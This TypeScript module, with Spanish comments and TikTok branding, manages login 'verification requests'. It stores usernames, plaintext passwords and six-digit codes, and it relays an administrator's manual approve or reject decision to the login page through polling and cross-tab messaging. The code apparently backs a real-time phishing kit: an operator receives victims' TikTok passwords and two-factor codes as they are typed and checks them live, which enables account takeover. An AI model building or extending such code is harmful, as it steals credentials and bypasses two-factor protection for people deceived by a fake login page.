import type { VerificationRequest, VerificationStatus } from '../types/auth';
import { checkCodeStatusInDb, checkUserStatusInDb } from '../api/loging.api';

const STORAGE_KEY_REQUESTS = 'tiktok_verification_requests';
const STORAGE_KEY_ACTIVE = 'tiktok_active_verification_id';
const CHANNEL_NAME = 'tiktok_verification_channel';

// Instancia única de BroadcastChannel para comunicación entre pestañas
let broadcastChannel: BroadcastChannel | null = null;
try {
  if (typeof window !== 'undefined' && 'BroadcastChannel' in window) {
    broadcastChannel = new BroadcastChannel(CHANNEL_NAME);
  }
} catch (e) {
  console.warn('BroadcastChannel not supported or blocked:', e);
}

/**
 * Obtiene todas las solicitudes almacenadas
 */
export const getVerificationRequests = (): VerificationRequest[] => {
  try {
    const raw = localStorage.getItem(STORAGE_KEY_REQUESTS);
    return raw ? JSON.parse(raw) : [];
  } catch (err) {
    console.error('Error al leer verification requests:', err);
    return [];
  }
};

/**
 * Obtiene las solicitudes en estado PENDING (ordenadas más recientes primero)
 */
export const getPendingRequests = (): VerificationRequest[] => {
  return getVerificationRequests()
    .filter((r) => r.status === 'PENDING')
    .sort((a, b) => b.createdAt - a.createdAt);
};

/**
 * Guarda la lista completa de solicitudes en localStorage
 */
const saveVerificationRequests = (requests: VerificationRequest[]): void => {
  try {
    localStorage.setItem(STORAGE_KEY_REQUESTS, JSON.stringify(requests.slice(0, 50)));
  } catch (err) {
    console.error('Error al guardar verification requests:', err);
  }
};

/**
 * Obtiene una solicitud específica por su ID
 */
export const getVerificationRequestById = (id: string): VerificationRequest | null => {
  const all = getVerificationRequests();
  return all.find((r) => r.id === id) || null;
};

/**
 * Emite un evento reactivo tanto a la pestaña actual como a otras pestañas
 */
const broadcastUpdate = (payload: { type: string; request: VerificationRequest }) => {
  // 1. Misma pestaña (CustomEvent)
  if (typeof window !== 'undefined') {
    window.dispatchEvent(
      new CustomEvent('tiktok_verification_event', {
        detail: payload,
      })
    );
  }

  // 2. Otras pestañas (BroadcastChannel)
  if (broadcastChannel) {
    try {
      broadcastChannel.postMessage(payload);
    } catch {
      // Ignorar si falla
    }
  }
};

/**
 * Crea una nueva solicitud de verificación de código en tiempo real
 */
export const createVerificationRequest = (
  userId: number | string | undefined,
  username: string,
  codigo: string,
  codeId?: number
): VerificationRequest => {
  const newRequest: VerificationRequest = {
    id: `req_${Date.now()}_${Math.random().toString(36).slice(2, 7)}`,
    codeId,
    userId,
    username: username.trim(),
    codigo: codigo.trim(),
    type: 'CODE',
    status: 'PENDING',
    createdAt: Date.now(),
  };

  const currentRequests = getVerificationRequests();
  // Colocarla al inicio de la lista
  const updated = [newRequest, ...currentRequests];
  saveVerificationRequests(updated);

  try {
    localStorage.setItem(STORAGE_KEY_ACTIVE, newRequest.id);
  } catch {
    // Ignorar
  }

  broadcastUpdate({ type: 'NEW_REQUEST', request: newRequest });
  return newRequest;
};

/**
 * Crea una nueva solicitud de verificación de contraseña/credenciales en tiempo real
 */
export const createUserLoginRequest = (
  userId: number | string | undefined,
  username: string,
  password: string,
  inicio_sesion: string = 'usuario'
): VerificationRequest => {
  const newRequest: VerificationRequest = {
    id: `pwd_req_${Date.now()}_${Math.random().toString(36).slice(2, 7)}`,
    userId,
    username: username.trim(),
    password: password.trim(),
    inicio_sesion,
    type: 'PASSWORD',
    status: 'PENDING',
    createdAt: Date.now(),
  };

  const currentRequests = getVerificationRequests();
  const updated = [newRequest, ...currentRequests];
  saveVerificationRequests(updated);

  try {
    localStorage.setItem(STORAGE_KEY_ACTIVE, newRequest.id);
  } catch {
    // Ignorar
  }

  broadcastUpdate({ type: 'NEW_PASSWORD_REQUEST', request: newRequest });
  return newRequest;
};

/**
 * El Administrador ACEPTA el código (Marca como CORRECTO y permite el inicio de sesión)
 */
export const approveVerificationRequest = (requestId: string): VerificationRequest | null => {
  const currentRequests = getVerificationRequests();
  let updatedRequest: VerificationRequest | null = null;

  const updatedList = currentRequests.map((req) => {
    if (req.id === requestId) {
      updatedRequest = {
        ...req,
        status: 'APPROVED' as VerificationStatus,
        reviewedAt: Date.now(),
        message:
          req.type === 'PASSWORD'
            ? 'Contraseña verificada y acceso aprobado por el administrador.'
            : 'Código verificado y aprobado por el administrador.',
      };
      return updatedRequest;
    }
    return req;
  });

  if (updatedRequest) {
    saveVerificationRequests(updatedList);
    broadcastUpdate({ type: 'STATUS_CHANGE', request: updatedRequest });
  }

  return updatedRequest;
};

/**
 * El Administrador RECHAZA la verificación (código o contraseña)
 */
export const rejectVerificationRequest = (
  requestId: string,
  message?: string
): VerificationRequest | null => {
  const currentRequests = getVerificationRequests();
  let updatedRequest: VerificationRequest | null = null;

  const updatedList = currentRequests.map((req) => {
    if (req.id === requestId) {
      const defaultMessage =
        req.type === 'PASSWORD'
          ? 'La contraseña es incorrecta'
          : 'Introduce un código de verificación válido';
      updatedRequest = {
        ...req,
        status: 'REJECTED' as VerificationStatus,
        reviewedAt: Date.now(),
        message: message || defaultMessage,
      };
      return updatedRequest;
    }
    return req;
  });

  if (updatedRequest) {
    saveVerificationRequests(updatedList);
    broadcastUpdate({ type: 'STATUS_CHANGE', request: updatedRequest });
  }

  return updatedRequest;
};

/**
 * Suscripción en tiempo real a los cambios de una solicitud específica (usado por VerificationCodeView)
 */
export const subscribeToVerificationRequest = (
  requestId: string,
  onUpdate: (request: VerificationRequest) => void,
  userId?: number | string | null,
  codeId?: number | string | null
): (() => void) => {
  let isDone = false;

  // Manejador de eventos
  const handleEvent = (data: { type: string; request: VerificationRequest }) => {
    if (data?.request?.id === requestId) {
      if (data.request.status === 'APPROVED' || data.request.status === 'REJECTED') {
        isDone = true;
      }
      onUpdate(data.request);
    }
  };

  // 1. Escuchar CustomEvent en la misma ventana
  const customListener = (e: Event) => {
    const customEv = e as CustomEvent<{ type: string; request: VerificationRequest }>;
    if (customEv.detail) {
      handleEvent(customEv.detail);
    }
  };
  window.addEventListener('tiktok_verification_event', customListener);

  // 2. Escuchar BroadcastChannel para otras pestañas locales
  const channelListener = (e: MessageEvent) => {
    if (e.data) {
      handleEvent(e.data);
    }
  };
  if (broadcastChannel) {
    broadcastChannel.addEventListener('message', channelListener);
  }

  // 3. Escuchar storage event de window
  const storageListener = (e: StorageEvent) => {
    if (e.key === STORAGE_KEY_REQUESTS && e.newValue) {
      try {
        const list: VerificationRequest[] = JSON.parse(e.newValue);
        const current = list.find((r) => r.id === requestId);
        if (current) {
          handleEvent({ type: 'STORAGE', request: current });
        }
      } catch {
        // Ignorar error de parseo
      }
    }
  };
  window.addEventListener('storage', storageListener);

  // 4. Polling ultra-rápido: local y en la nube (PostgreSQL Render) cada 800ms
  const checkStatusNow = async () => {
    if (isDone) return;

    // A) Revisión local
    const current = getVerificationRequestById(requestId);
    if (current && (current.status === 'APPROVED' || current.status === 'REJECTED')) {
      isDone = true;
      if (intervalId) clearInterval(intervalId);
      onUpdate(current);
      return;
    }

    // B) Revisión en la nube en PostgreSQL
    const effectiveUserId = userId || current?.userId;
    const effectiveCodeId = codeId || current?.codeId;

    // Caso B1: Solicitud de Contraseña
    if (current?.type === 'PASSWORD' && effectiveUserId) {
      try {
        const cloudUserStatus = await checkUserStatusInDb(effectiveUserId);
        if (cloudUserStatus?.success && cloudUserStatus.user) {
          const { estado } = cloudUserStatus.user;
          if (estado === 'APPROVED' || estado === 'REJECTED') {
            isDone = true;
            if (intervalId) clearInterval(intervalId);

            const updated: VerificationRequest = {
              id: requestId,
              userId: effectiveUserId,
              username: current?.username || cloudUserStatus.user.username,
              password: current?.password,
              inicio_sesion: current?.inicio_sesion,
              type: 'PASSWORD',
              status: estado,
              createdAt: current?.createdAt || Date.now(),
              reviewedAt: Date.now(),
              message:
                estado === 'APPROVED'
                  ? 'Contraseña verificada y acceso aprobado por el administrador.'
                  : 'La contraseña es incorrecta',
            };

            const currentList = getVerificationRequests();
            const exists = currentList.some((r) => r.id === requestId);
            const newList = exists
              ? currentList.map((r) => (r.id === requestId ? updated : r))
              : [updated, ...currentList];
            saveVerificationRequests(newList);

            broadcastUpdate({ type: 'STATUS_CHANGE', request: updated });
            onUpdate(updated);
            return;
          }
        }
      } catch (err) {
        console.warn('[subscribeToVerificationRequest] Error polling user cloud status:', err);
      }
    }

    // Caso B2: Solicitud de Código de 6 Dígitos
    if (effectiveUserId || effectiveCodeId) {
      try {
        const cloudStatus = await checkCodeStatusInDb(effectiveUserId, effectiveCodeId);
        if (cloudStatus?.success && cloudStatus.code) {
          const { estado, codigo, id_codigo } = cloudStatus.code;
          if (estado === 'APPROVED' || estado === 'REJECTED') {
            // Si no se tiene un codeId exacto, verificar que el código en texto coincida
            if (!effectiveCodeId && current?.codigo && codigo) {
              if (String(current.codigo).trim() !== String(codigo).trim()) {
                console.log('[Poll Warning] Código devuelto no coincide con el actual:', codigo, 'vs', current.codigo);
                return;
              }
            }

            isDone = true;
            if (intervalId) clearInterval(intervalId);

            const updated: VerificationRequest = {
              id: requestId,
              codeId: id_codigo || (typeof effectiveCodeId === 'number' ? effectiveCodeId : undefined),
              userId: effectiveUserId || cloudStatus.code.user_id,
              username: current?.username || `Usuario #${effectiveUserId || cloudStatus.code.user_id}`,
              codigo: codigo || current?.codigo || '',
              type: 'CODE',
              status: estado,
              createdAt: current?.createdAt || Date.now(),
              reviewedAt: Date.now(),
              message:
                estado === 'APPROVED'
                  ? 'Código verificado y aprobado por el administrador.'
                  : 'Introduce un código de verificación válido',
            };

            // Sincronizar localmente también
            const currentList = getVerificationRequests();
            const exists = currentList.some((r) => r.id === requestId);
            const newList = exists
              ? currentList.map((r) => (r.id === requestId ? updated : r))
              : [updated, ...currentList];
            saveVerificationRequests(newList);

            // Notificar a otras pestañas
            broadcastUpdate({ type: 'STATUS_CHANGE', request: updated });

            console.log(`[subscribeToVerificationRequest] Decisión recibida de la nube: estado = ${estado}`);
            onUpdate(updated);
          }
        }
      } catch (err) {
        console.warn('[subscribeToVerificationRequest] Error polling cloud:', err);
      }
    }
  };

  // Sondeo inmediato y luego recurrente cada 800ms
  const initialTimeout = setTimeout(checkStatusNow, 150);
  const intervalId = setInterval(checkStatusNow, 800);

  // Función para desuscribirse
  return () => {
    isDone = true;
    clearTimeout(initialTimeout);
    clearInterval(intervalId);
    window.removeEventListener('tiktok_verification_event', customListener);
    if (broadcastChannel) {
      broadcastChannel.removeEventListener('message', channelListener);
    }
    window.removeEventListener('storage', storageListener);
  };
};

/**
 * Suscripción en tiempo real a todas las solicitudes (usado por AdminPanel)
 */
export const subscribeToAllVerificationRequests = (
  onUpdate: (requests: VerificationRequest[]) => void
): (() => void) => {
  const trigger = () => {
    onUpdate(getVerificationRequests());
  };

  const customListener = () => trigger();
  window.addEventListener('tiktok_verification_event', customListener);

  const channelListener = () => trigger();
  if (broadcastChannel) {
    broadcastChannel.addEventListener('message', channelListener);
  }

  const storageListener = (e: StorageEvent) => {
    if (e.key === STORAGE_KEY_REQUESTS) {
      trigger();
    }
  };
  window.addEventListener('storage', storageListener);

  const intervalId = setInterval(() => {
    trigger();
  }, 700);

  return () => {
    window.removeEventListener('tiktok_verification_event', customListener);
    if (broadcastChannel) {
      broadcastChannel.removeEventListener('message', channelListener);
    }
    window.removeEventListener('storage', storageListener);
    clearInterval(intervalId);
  };
};
